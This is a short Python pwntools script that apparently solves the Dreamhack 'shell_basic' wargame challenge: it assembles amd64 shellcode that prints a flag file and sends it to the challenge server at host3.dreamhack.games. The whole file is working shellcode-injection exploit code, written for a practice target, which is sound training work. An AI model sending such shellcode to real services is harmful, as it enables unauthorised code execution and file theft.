from pwn import *


def linux_shellcode_exploiter():
    # context.log_level = "debug"
    r = remote("host3.dreamhack.games", 8205)
    context(arch="amd64", os="linux")
    sh = pwnlib.shellcraft.cat("/home/shell_basic/flag_name_is_loooooong", fd=1)

    r.sendlineafter(b"shellcode: ", asm(sh))
    print(r.recvline().decode())


if __name__ == "__main__":
    linux_shellcode_exploiter()
